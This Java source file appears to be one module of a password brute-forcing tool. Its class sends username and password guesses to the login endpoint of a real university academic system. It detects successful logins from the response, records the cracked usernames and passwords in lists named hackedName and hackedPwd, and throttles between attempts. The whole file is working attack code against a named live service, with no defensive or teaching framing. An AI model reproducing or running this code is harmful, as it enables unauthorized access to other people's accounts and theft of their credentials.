import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class JwcBlast extends Blast{

	public JwcBlast(AccackUI a) {
		super(a);
		// TODO Auto-generated constructor stub
	}

	@Override
	public void connect(String name, String pwd) {
		// TODO Auto-generated method stub
		String str = "groupId=&j_username="+name+"&j_password="
				+ pwd;
		
		try {
			URL url = new URL("http://jwc.lzu.cn/academic/j_acegi_security_check");
			HttpURLConnection conn = (HttpURLConnection)url.openConnection();
			conn.setConnectTimeout(10000);
			conn.setDoOutput(true);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length", ""+str.length());
			OutputStream oStream = conn.getOutputStream();
			oStream.write(str.getBytes());
			conn.getResponseCode();
			//System.out.println();
			InputStream in = conn.getInputStream();
			byte[] b = new byte[1024];
			String tmp = null;
			StringBuffer stringBuilder = new StringBuffer();
			int len;
			while((len=in.read(b))!=-1) {
				tmp = new String(b, 0,len,"GBK");
				stringBuilder.append(tmp);
			}
			StringBuilder str1 = new StringBuilder(frame.getTextArea());
			str1.append("\n"+name);
			frame.setTextArea(str1.toString());
			
			in.close();
			oStream.close();
			conn.disconnect();
			
			if(stringBuilder.indexOf("frameset")!=-1){
				str1 = null;
				str1 = new StringBuilder(frame.getTextArea());
				str1.append("\n"+name);
				str1.append("--------------------------------"+"SUCCEED");
				frame.setTextArea(str1.toString());
				total++;
				//list.add(name);
				hackedName.add(name);
				hackedPwd.add(pwd);
			} 
			Thread.sleep(3000);
			stringBuilder=null;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}


}
